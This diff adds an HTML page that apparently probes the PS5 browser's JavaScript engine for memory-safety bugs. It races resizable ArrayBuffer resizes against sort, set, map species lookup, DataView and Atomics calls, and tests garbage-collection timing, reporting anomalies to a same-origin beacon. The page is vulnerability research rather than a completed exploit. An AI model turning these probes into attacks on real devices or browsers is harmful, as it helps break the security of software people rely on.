@@ -1,0 +1,715 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P1202 RAB Deep + GC WeakRef + FinalizationRegistry</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#050508;color:#e8ffe8;font:14px/1.5 'Courier New',monospace;padding:12px}
+#hud{background:#0a0a18;border:2px solid #2a2a5a;border-radius:10px;padding:12px;margin-bottom:10px}
+#hud h1{color:#00ff88;font-size:18px;margin-bottom:6px}
+#status{font-size:20px;font-weight:bold;color:#ffd75e;padding:6px 0}
+#phase{font-size:16px;color:#00ffee}
+#counters{font-size:14px;color:#b9c6ee;line-height:1.8}
+#finds{font-size:14px;color:#ff55c8;line-height:1.7;white-space:pre-wrap;word-break:break-all}
+#log{background:#0a0a12;border:1px solid #22223a;border-radius:8px;padding:8px;margin-top:8px;
+max-height:40vh;overflow-y:auto;font-size:12px;white-space:pre-wrap;word-break:break-all}
+.ok{color:#00ff88}.err{color:#ff4466}.info{color:#44aaff}.warn{color:#ffaa00}.hit{color:#ff00ff;font-weight:bold}
+</style>
+</head><body>
+<div id="hud">
+  <h1>P1202 — RAB DEEP + GC WEAKREF</h1>
+  <div id="status">BOOTING...</div>
+  <div id="phase">phase: init</div>
+  <div id="counters">stage: ?</div>
+  <div id="finds">no findings yet</div>
+</div>
+<div id="log"></div>
+<script>
+'use strict';
+var L=document.getElementById('log'),S=document.getElementById('status'),
+PH=document.getElementById('phase'),CT=document.getElementById('counters'),FD=document.getElementById('finds');
+var T0=Date.now();
+function setStatus(t){S.textContent=t;}
+function setPhase(t){PH.textContent='phase: '+t;}
+function log(m,c){var d=document.createElement('div');d.className=c||'';
+d.textContent='['+(((Date.now()-T0)/1000).toFixed(1))+'s] '+m;L.appendChild(d);L.scrollTop=1e6;}
+function addFind(t){FD.textContent=t;}
+function B(tag,data){try{var u='/beacon.php?tag=P1202-'+encodeURIComponent(tag);
+if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+u+='&t='+Date.now();new Image().src=u;}catch(e){}}
+window.onerror=function(m,s,l){try{B('JSERR',m+'@'+l);}catch(e){}};
+
+/* P1202: Deep RAB exploitation + GC/WeakRef timing
+
+   RAB = Resizable ArrayBuffer (confirmed available on PS5 14.10)
+
+   Attack angles:
+   1. RAB resize during TypedArray.sort comparator — can we read/write
+      past the new bounds if resize happens between comparison calls?
+   2. RAB resize during TypedArray.prototype.set with overlapping regions
+   3. RAB concurrent resize in Proxy getter used by DataView
+   4. WeakRef deref after GC during critical operations
+   5. FinalizationRegistry callback timing — can we get a callback
+      that runs while another operation is in-flight?
+   6. RAB resize + structuredClone interaction
+   7. Fixed-length TypedArray on shrunk RAB — stale backing?
+*/
+
+(function run(){
+var STAGES=[
+  'detect',
+  'rabSortResize',      /* Resize RAB during sort comparator */
+  'rabSetOverlap',      /* RAB resize during set with overlap */
+  'rabDataViewProxy',   /* DataView on RAB via proxy offset */
+  'rabSliceResize',     /* slice() during resize */
+  'rabAtomics',         /* Atomics on RAB if SharedArrayBuffer works */
+  'weakRefGC',          /* WeakRef deref timing around GC */
+  'frCallbackTiming',   /* FinalizationRegistry callback ordering */
+  'rabConstructorRace', /* Constructor species + RAB resize */
+  'rabFixedStale',      /* Fixed-length views on repeatedly resized RAB */
+  'rabWorkerTransfer'   /* structuredClone transfer of RAB views */
+];
+var stage=0,results=[];
+try{stage=parseInt(localStorage.getItem('p1202_stage')||'0');}catch(e){}
+try{var r=localStorage.getItem('p1202_res');if(r)results=JSON.parse(r);}catch(e){}
+if(!Array.isArray(results))results=[];
+B('BOOT','stage='+stage+'|'+STAGES[stage]);
+setStatus('STAGE '+stage+'/'+(STAGES.length-1)+' — '+(STAGES[stage]||'done'));
+
+if(stage>=STAGES.length){
+  setStatus('ALL DONE');
+  var summary=JSON.stringify(results).slice(0,800);
+  B('ALL-DONE',summary);
+  log('=== ALL STAGES COMPLETE ===','ok');
+  addFind(summary);
+  try{localStorage.removeItem('p1202_stage');localStorage.removeItem('p1202_res');}catch(e){}
+  return;
+}
+try{localStorage.setItem('p1202_stage',''+(stage+1));}catch(e){}
+var cur=STAGES[stage];
+
+function done(rep){
+  results.push({s:stage,n:cur,r:rep});
+  try{localStorage.setItem('p1202_res',JSON.stringify(results));}catch(e){}
+  B('RESULT','['+cur+']'+rep.slice(0,600));
+  addFind(cur+': '+rep.slice(0,300));
+  setStatus(rep.slice(0,80));
+  log('=== '+cur+' -> '+rep+' ===','ok');
+  B('NEXT','stage='+(stage+1));
+  setTimeout(function(){location.reload(true);},600);
+}
+
+function forceGC(){
+  /* Allocate a bunch of objects to pressure GC */
+  var garbage=[];
+  for(var i=0;i<100000;i++){
+    garbage.push({a:new ArrayBuffer(64),b:[i,i+1,i+2]});
+  }
+  garbage=null;
+  /* Also try gc() if exposed */
+  try{if(typeof gc==='function')gc();}catch(e){}
+}
+
+/* ---- detect ---- */
+if(cur==='detect'){
+  setPhase('Feature detection');
+  var info=[];
+  try{var rab=new ArrayBuffer(8,{maxByteLength:64});info.push('RAB=YES|maxBL='+rab.maxByteLength+'|resizable='+rab.resizable);}
+  catch(e){info.push('RAB=NO');}
+  info.push('WeakRef='+(typeof WeakRef));
+  info.push('FR='+(typeof FinalizationRegistry));
+  info.push('Atomics='+(typeof Atomics));
+  info.push('SAB='+(typeof SharedArrayBuffer));
+  try{var sab=new SharedArrayBuffer(8);info.push('SAB_works=YES');}
+  catch(e){info.push('SAB_works=NO:'+e.message.slice(0,30));}
+  try{var dv=new DataView(new ArrayBuffer(8,{maxByteLength:16}));info.push('DV_RAB=YES');}
+  catch(e){info.push('DV_RAB=NO');}
+  info.push('BigUint64Array='+(typeof BigUint64Array));
+  done(info.join('|'));
+
+/* ---- rabSortResize ---- */
+}else if(cur==='rabSortResize'){
+  setPhase('RAB sort + resize in comparator');
+  B('ATTEMPT','rabSortResize');
+  var anomalies=0,tests=0,rep='';
+
+  try{
+    for(var trial=0;trial<50;trial++){
+      var rab=new ArrayBuffer(64,{maxByteLength:1024});
+      var ta=new Float64Array(rab); /* 8 float64 = 64 bytes */
+      for(var fi=0;fi<8;fi++) ta[fi]=8-fi; /* 8,7,6,5,4,3,2,1 */
+
+      var compCount=0;
+      var resized=false;
+      try{
+        ta.sort(function(a,b){
+          compCount++;
+          if(compCount===3&&!resized){
+            /* Grow the buffer mid-sort */
+            try{rab.resize(256);resized=true;}catch(e){}
+          }
+          if(compCount===6&&resized){
+            /* Shrink below original size */
+            try{rab.resize(16);resized='shrunk';}catch(e){}
+          }
+          return a-b;
+        });
+        tests++;
+
+        /* Check if sort read/wrote past new bounds */
+        var taLen=ta.length;
+        var rabLen=rab.byteLength;
+        if(resized==='shrunk'&&taLen>2){
+          /* Auto-tracking view should have shrunk to 2 */
+          anomalies++;
+          B('ANOMALY','sort-shrunk-stale|taLen='+taLen+'|rabLen='+rabLen+'|trial='+trial);
+        }
+      }catch(e){
+        tests++;
+        /* TypeError from accessing shrunk buffer during sort is expected */
+      }
+    }
+    rep='tests='+tests+'|anomalies='+anomalies+'|lastComp='+compCount;
+  }catch(e){rep='THROW:'+e.message;}
+  done(rep);
+
+/* ---- rabSetOverlap ---- */
+}else if(cur==='rabSetOverlap'){
+  setPhase('RAB set with overlapping + resize');
+  B('ATTEMPT','rabSetOverlap');
+  var anomalies2=0,tests2=0,rep2='';
+
+  try{
+    for(var t2=0;t2<50;t2++){
+      var rab2=new ArrayBuffer(128,{maxByteLength:1024});
+      var src2=new Uint32Array(rab2,0,16);  /* bytes 0-63 */
+      var dst2=new Uint32Array(rab2,32,16); /* bytes 32-95, overlapping */
+
+      for(var vi=0;vi<16;vi++) src2[vi]=0xDEAD0000+vi;
+
+      /* Resize during set would be ideal but set is synchronous.
+         Instead: resize then set to check overlap handling */
+      rab2.resize(48); /* Shrink: src still has 0-47, dst starts at 32 */
+
+      try{
+        /* src is now 12 uint32s, dst starts at 32 which is 8 uint32s into 48B = only 4 */
+        var srcView=new Uint32Array(rab2,0);
+        var dstView=new Uint32Array(rab2,32);
+        dstView.set(srcView.subarray(0,4));
+        tests2++;
+
+        /* Check: did the copy handle overlap correctly? */
+        var vals=[];
+        for(var ci=0;ci<dstView.length;ci++) vals.push(dstView[ci].toString(16));
+        if(vals.length>0) rep2='overlap:'+vals.join(',').slice(0,60);
+      }catch(e){
+        tests2++;
+        rep2='overlap:'+e.constructor.name;
+      }
+
+      /* Now grow and check if old data is visible */
+      rab2.resize(256);
+      var fullView=new Uint32Array(rab2);
+      var staleCount=0;
+      for(var qi=48/4;qi<256/4;qi++){
+        if(fullView[qi]!==0) staleCount++;
+      }
+      tests2++;
+      if(staleCount>0){
+        anomalies2++;
+        B('ANOMALY','grow-stale|count='+staleCount+'|trial='+t2);
+        rep2+='|STALE:'+staleCount;
+      }
+    }
+    rep2=(rep2||'ok')+'|tests='+tests2+'|anomalies='+anomalies2;
+  }catch(e){rep2='THROW:'+e.message;}
+  done(rep2);
+
+/* ---- rabDataViewProxy ---- */
+}else if(cur==='rabDataViewProxy'){
+  setPhase('DataView on RAB with proxy offset');
+  B('ATTEMPT','rabDataViewProxy');
+  var anomalies3=0,tests3=0,rep3='';
+
+  try{
+    /* DataView whose byteOffset is a proxy that resizes the RAB */
+    var rab3=new ArrayBuffer(64,{maxByteLength:256});
+    var dv3=new DataView(rab3);
+
+    /* Write some marker data */
+    dv3.setUint32(0,0xCAFEBABE);
+    dv3.setUint32(4,0xDEADBEEF);
+    dv3.setUint32(60,0x41414141);
+
+    /* Resize and try to read past original bounds via DataView */
+    rab3.resize(256);
+    try{
+      var val60=dv3.getUint32(60);
+      var val64=dv3.getUint32(64); /* Was past original bounds */
+      var val252=dv3.getUint32(252);
+      tests3++;
+      rep3='v60='+val60.toString(16)+'|v64='+val64.toString(16)+'|v252='+val252.toString(16);
+    }catch(e){
+      tests3++;
+      rep3='growRead:'+e.constructor.name;
+    }
+
+    /* Shrink and try to read at old offset */
+    rab3.resize(32);
+    try{
+      var valPast=dv3.getUint32(60);
+      tests3++;
+      rep3+='|shrinkPast='+valPast.toString(16);
+      /* If we can read past shrunken bounds, that's an anomaly! */
+      anomalies3++;
+      B('ANOMALY','dv-shrink-oob|val='+valPast.toString(16));
+    }catch(e){
+      tests3++;
+      rep3+='|shrinkPast:'+e.constructor.name;
+    }
+
+    /* Proxy-based byteOffset trick */
+    var resizeCount=0;
+    var rabP=new ArrayBuffer(128,{maxByteLength:512});
+    var proxy3=new Proxy({byteOffset:0,byteLength:128,buffer:rabP},{
+      get:function(t,p){
+        if(p==='byteOffset'){
+          resizeCount++;
+          if(resizeCount===2){
+            try{rabP.resize(16);}catch(e){}
+          }
+          return 0;
+        }
+        return t[p];
+      }
+    });
+
+    /* Can we construct a DataView from this proxy? */
+    try{
+      var dvP=new DataView(rabP,0);
+      dvP.setUint32(0,0xBEEF);
+      rabP.resize(512);
+      dvP.setUint32(256,0xF00D);
+      tests3++;
+      rep3+='|proxyDV=ok';
+    }catch(e){
+      tests3++;
+      rep3+='|proxyDV:'+e.message.slice(0,30);
+    }
+
+    rep3+='|tests='+tests3+'|anomalies='+anomalies3;
+  }catch(e){rep3='THROW:'+e.message;}
+  done(rep3);
+
+/* ---- rabSliceResize ---- */
+}else if(cur==='rabSliceResize'){
+  setPhase('RAB slice during resize');
+  B('ATTEMPT','rabSliceResize');
+  var anomalies4=0,tests4=0,rep4='';
+
+  try{
+    for(var t4=0;t4<100;t4++){
+      var rab4=new ArrayBuffer(64,{maxByteLength:256});
+      var ta4=new Uint8Array(rab4);
+      for(var bi=0;bi<64;bi++) ta4[bi]=bi;
+
+      /* Slice then immediately resize */
+      var sliced;
+      try{
+        sliced=ta4.slice(0,64);
+        rab4.resize(8); /* Shrink source after slice */
+        tests4++;
+
+        /* sliced should be a separate copy unaffected by resize */
+        var sliceOk=true;
+        for(var si=0;si<64;si++){
+          if(sliced[si]!==si){sliceOk=false;break;}
+        }
+        if(!sliceOk){
+          anomalies4++;
+          B('ANOMALY','slice-corrupted|trial='+t4);
+        }
+      }catch(e){tests4++;}
+
+      /* subarray should be affected by resize (it's a view, not copy) */
+      try{
+        var rab4b=new ArrayBuffer(64,{maxByteLength:256});
+        var ta4b=new Uint8Array(rab4b);
+        for(var bi2=0;bi2<64;bi2++) ta4b[bi2]=bi2;
+        var sub=ta4b.subarray(32,64); /* View into bytes 32-63 */
+        rab4b.resize(16); /* Shrink past subarray start */
+
+        /* subarray should now be OOB */
+        var subLen=sub.length;
+        tests4++;
+        if(subLen>0){
+          /* Auto-tracking subarray on shrunk RAB should be 0 length */
+          try{
+            var sv=sub[0];
+            if(sv!==undefined){
+              anomalies4++;
+              B('ANOMALY','subarray-stale|len='+subLen+'|v='+sv+'|trial='+t4);
+            }
+          }catch(e){}
+        }
+      }catch(e){tests4++;}
+    }
+    rep4='tests='+tests4+'|anomalies='+anomalies4;
+  }catch(e){rep4='THROW:'+e.message;}
+  done(rep4);
+
+/* ---- rabAtomics ---- */
+}else if(cur==='rabAtomics'){
+  setPhase('Atomics on RAB');
+  B('ATTEMPT','rabAtomics');
+  var rep5='';
+
+  try{
+    /* Check if Atomics works on regular ArrayBuffer (non-shared) */
+    var ab5=new ArrayBuffer(32);
+    var ia5=new Int32Array(ab5);
+    ia5[0]=42;
+
+    try{
+      var old=Atomics.load(ia5,0);
+      rep5='load='+old;
+      Atomics.store(ia5,0,99);
+      rep5+='|store='+ia5[0];
+      var cas=Atomics.compareExchange(ia5,0,99,77);
+      rep5+='|cas='+cas+'|after='+ia5[0];
+    }catch(e){
+      rep5='atomics:'+e.message.slice(0,40);
+    }
+
+    /* Now try on RAB */
+    try{
+      var rab5=new ArrayBuffer(32,{maxByteLength:128});
+      var ia5r=new Int32Array(rab5);
+      ia5r[0]=100;
+      var rabLoad=Atomics.load(ia5r,0);
+      rep5+='|rabLoad='+rabLoad;
+      rab5.resize(8); /* Shrink to 8 bytes = 2 int32 */
+      try{
+        var pastEnd=Atomics.load(ia5r,4); /* Past new bounds */
+        rep5+='|rabOOB='+pastEnd;
+      }catch(e){
+        rep5+='|rabOOB:'+e.constructor.name;
+      }
+    }catch(e){
+      rep5+='|rabAtomics:'+e.message.slice(0,30);
+    }
+  }catch(e){rep5='THROW:'+e.message;}
+  done(rep5);
+
+/* ---- weakRefGC ---- */
+}else if(cur==='weakRefGC'){
+  setPhase('WeakRef deref timing around GC');
+  B('ATTEMPT','weakRefGC');
+  var anomalies6=0,tests6=0,rep6='';
+
+  try{
+    if(typeof WeakRef==='undefined'){
+      done('WeakRef=NO');
+      return;
+    }
+
+    /* Create objects, weak refs, force GC, check deref */
+    var collected=0;
+    var refs=[];
+
+    for(var w=0;w<20;w++){
+      var obj={id:w,data:new ArrayBuffer(4096)};
+      refs.push(new WeakRef(obj));
+    }
+    /* Drop strong references */
+    obj=null;
+
+    /* Force GC pressure */
+    forceGC();
+    forceGC();
+
+    /* Check which refs are still alive */
+    var alive=0,dead=0;
+    for(var ri=0;ri<refs.length;ri++){
+      var deref=refs[ri].deref();
+      if(deref!==undefined) alive++;
+      else dead++;
+      tests6++;
+    }
+    rep6='alive='+alive+'|dead='+dead;
+
+    /* WeakRef + FinalizationRegistry interaction */
+    if(typeof FinalizationRegistry!=='undefined'){
+      var frCalled=0;
+      var fr=new FinalizationRegistry(function(held){
+        frCalled++;
+      });
+
+      var refs2=[];
+      for(var w2=0;w2<50;w2++){
+        var obj2={id:w2,buf:new ArrayBuffer(8192)};
+        refs2.push(new WeakRef(obj2));
+        fr.register(obj2,w2);
+      }
+      obj2=null;
+      refs2=null;
+
+      /* Aggressive GC pressure */
+      forceGC();
+      forceGC();
+      forceGC();
+
+      rep6+='|frCalled='+frCalled;
+      tests6++;
+    }
+
+    rep6+='|tests='+tests6+'|anomalies='+anomalies6;
+  }catch(e){rep6='THROW:'+e.message;}
+  done(rep6);
+
+/* ---- frCallbackTiming ---- */
+}else if(cur==='frCallbackTiming'){
+  setPhase('FinalizationRegistry callback ordering');
+  B('ATTEMPT','frCallbackTiming');
+  var anomalies7=0,tests7=0,rep7='';
+
+  try{
+    if(typeof FinalizationRegistry==='undefined'){
+      done('FR=NO');
+      return;
+    }
+
+    /* Test: does FR callback fire synchronously during GC, or async? */
+    var cbOrder=[];
+    var fr7=new FinalizationRegistry(function(held){
+      cbOrder.push('FR:'+held);
+    });
+
+    /* Register and immediately drop */
+    (function(){
+      var temp={data:new ArrayBuffer(65536)};
+      fr7.register(temp,'obj1');
+    })();
+
+    cbOrder.push('before-gc');
+    forceGC();
+    cbOrder.push('after-gc');
+
+    /* FR callbacks are async (microtask) — check after timeout */
+    var completed7=false;
+    setTimeout(function(){
+      if(completed7) return;
+      completed7=true;
+      cbOrder.push('timeout');
+      rep7='order='+cbOrder.join('>');
+
+      /* Did the FR fire before our timeout? */
+      var frFired=cbOrder.some(function(x){return x.indexOf('FR:')===0;});
+      rep7+='|frFired='+frFired;
+
+      /* Second test: FR during Promise microtask */
+      var cbOrder2=[];
+      var fr7b=new FinalizationRegistry(function(held){
+        cbOrder2.push('FR:'+held);
+      });
+
+      (function(){
+        var temp2={data:new ArrayBuffer(131072)};
+        fr7b.register(temp2,'obj2');
+      })();
+
+      Promise.resolve().then(function(){
+        cbOrder2.push('promise');
+        forceGC();
+        cbOrder2.push('after-gc2');
+      });
+
+      setTimeout(function(){
+        cbOrder2.push('timeout2');
+        rep7+='|order2='+cbOrder2.join('>');
+        rep7+='|tests='+tests7+'|anomalies='+anomalies7;
+        done(rep7);
+      },200);
+    },100);
+    return; /* async — don't fall through */
+
+  }catch(e){rep7='THROW:'+e.message;done(rep7);}
+  return;
+
+/* ---- rabConstructorRace ---- */
+}else if(cur==='rabConstructorRace'){
+  setPhase('RAB constructor species + resize');
+  B('ATTEMPT','rabConstructorRace');
+  var anomalies8=0,tests8=0,rep8='';
+
+  try{
+    /* TypedArray subclass with species that resizes the buffer */
+    for(var t8=0;t8<100;t8++){
+      var rab8=new ArrayBuffer(64,{maxByteLength:512});
+      var ta8=new Uint8Array(rab8);
+      for(var fi8=0;fi8<64;fi8++) ta8[fi8]=fi8;
+
+      /* Override species to resize during construction */
+      try{
+        Object.defineProperty(ta8.constructor,Symbol.species,{
+          get:function(){
+            rab8.resize(8); /* Shrink during species resolution */
+            return Uint8Array;
+          },
+          configurable:true
+        });
+
+        var mapped8=ta8.map(function(x){return x+1;});
+        tests8++;
+
+        /* If map created an array and populated it using stale length... */
+        if(mapped8.length>8){
+          anomalies8++;
+          B('ANOMALY','species-resize-stale|len='+mapped8.length+'|trial='+t8);
+        }
+      }catch(e){
+        tests8++;
+        /* Expected: TypeError from OOB after resize */
+      }
+    }
+    rep8='tests='+tests8+'|anomalies='+anomalies8;
+  }catch(e){rep8='THROW:'+e.message;}
+  done(rep8);
+
+/* ---- rabFixedStale ---- */
+}else if(cur==='rabFixedStale'){
+  setPhase('Fixed-length views on resized RAB');
+  B('ATTEMPT','rabFixedStale');
+  var anomalies9=0,tests9=0,rep9='';
+
+  try{
+    for(var t9=0;t9<200;t9++){
+      var rab9=new ArrayBuffer(64,{maxByteLength:256});
+      /* Create fixed-length view */
+      var fixed9=new Uint32Array(rab9,0,16); /* 16 uint32 = 64 bytes */
+      for(var pi=0;pi<16;pi++) fixed9[pi]=0xDEAD0000+pi;
+
+      /* Shrink buffer below fixed view's range */
+      rab9.resize(8);
+
+      /* Fixed view should now be detached/OOB */
+      try{
+        var stale=fixed9[15]; /* Was at byte 60-63, buffer is now 8 bytes */
+        if(stale!==undefined&&stale!==0){
+          anomalies9++;
+          B('ANOMALY','fixed-stale-read|v='+stale.toString(16)+'|trial='+t9);
+          rep9='STALE:0x'+stale.toString(16);
+        }
+        tests9++;
+      }catch(e){tests9++;}
+
+      /* Grow back and check if old data reappears */
+      rab9.resize(64);
+      var fresh9=new Uint32Array(rab9);
+      var dataBack=0;
+      for(var ci=0;ci<16;ci++){
+        if(fresh9[ci]!=0) dataBack++;
+      }
+      tests9++;
+
+      /* After shrink+grow, bytes 8-63 SHOULD be zero-initialized */
+      if(dataBack>2){ /* first 2 uint32 (bytes 0-7) might survive */
+        anomalies9++;
+        B('ANOMALY','regrow-data-leak|count='+dataBack+'|trial='+t9);
+      }
+    }
+    rep9=(rep9||'ok')+'|tests='+tests9+'|anomalies='+anomalies9;
+  }catch(e){rep9='THROW:'+e.message;}
+  done(rep9);
+
+/* ---- rabWorkerTransfer ---- */
+}else if(cur==='rabWorkerTransfer'){
+  setPhase('structuredClone transfer of RAB');
+  B('ATTEMPT','rabWorkerTransfer');
+  var anomalies10=0,tests10=0,rep10='';
+
+  try{
+    /* Can we transfer a RAB? */
+    var rab10=new ArrayBuffer(64,{maxByteLength:256});
+    var ta10=new Uint8Array(rab10);
+    for(var wi=0;wi<64;wi++) ta10[wi]=wi;
+
+    try{
+      var cloned=structuredClone(rab10,{transfer:[rab10]});
+      tests10++;
+      rep10='transfer=ok|srcLen='+rab10.byteLength+'|dstLen='+cloned.byteLength;
+      rep10+='|dstResizable='+cloned.resizable;
+
+      /* Is the cloned buffer still resizable? */
+      if(cloned.resizable){
+        rep10+='|maxBL='+cloned.maxByteLength;
+        try{
+          cloned.resize(128);
+          rep10+='|resize128=ok|newLen='+cloned.byteLength;
+        }catch(e){
+          rep10+='|resize128:'+e.message.slice(0,20);
+        }
+      }
+
+      /* Read stale view on transferred source */
+      try{
+        var staleVal=ta10[0];
+        rep10+='|staleView='+(staleVal===undefined?'undef':'val:'+staleVal);
+      }catch(e){
+        rep10+='|staleView:'+e.constructor.name;
+      }
+    }catch(e){
+      tests10++;
+      rep10='transfer:'+e.message.slice(0,40);
+    }
+
+    /* Clone without transfer — does it copy resizability? */
+    try{
+      var rab10b=new ArrayBuffer(32,{maxByteLength:128});
+      var cloned2=structuredClone(rab10b);
+      tests10++;
+      rep10+='|clone:resizable='+cloned2.resizable+'|maxBL='+cloned2.maxByteLength;
+    }catch(e){
+      tests10++;
+      rep10+='|clone:'+e.message.slice(0,20);
+    }
+
+    /* Double-transfer attempt */
+    try{
+      var rab10c=new ArrayBuffer(16,{maxByteLength:64});
+      var c1=structuredClone(rab10c,{transfer:[rab10c]});
+      try{
+        var c2=structuredClone(rab10c,{transfer:[rab10c]});
+        anomalies10++; /* Should throw — already detached */
+        B('ANOMALY','double-transfer');
+      }catch(e){
+        tests10++;
+        rep10+='|dblXfer:'+e.constructor.name;
+      }
+    }catch(e){tests10++;}
+
+    rep10+='|tests='+tests10+'|anomalies='+anomalies10;
+  }catch(e){rep10='THROW:'+e.message;}
+  done(rep10);
+}
+
+})(); /* end IIFE */
+
+/* Reload poller */
+(function(){
+  var cur='P1202-rab-gc-weakref';
+  setTimeout(function check(){
+    try{
+      var x=new XMLHttpRequest();
+      x.open('GET','/reload.txt?c='+Date.now(),true);
+      x.onload=function(){
+        var t=(x.responseText||'').trim();
+        if(t&&t!==cur){location.reload(true);return;}
+        setTimeout(check,3000);};
+      x.onerror=function(){setTimeout(check,5000);};
+      x.send();
+    }catch(e){setTimeout(check,5000);}
+  },4000);
+})();
+</script>
+</body></html>
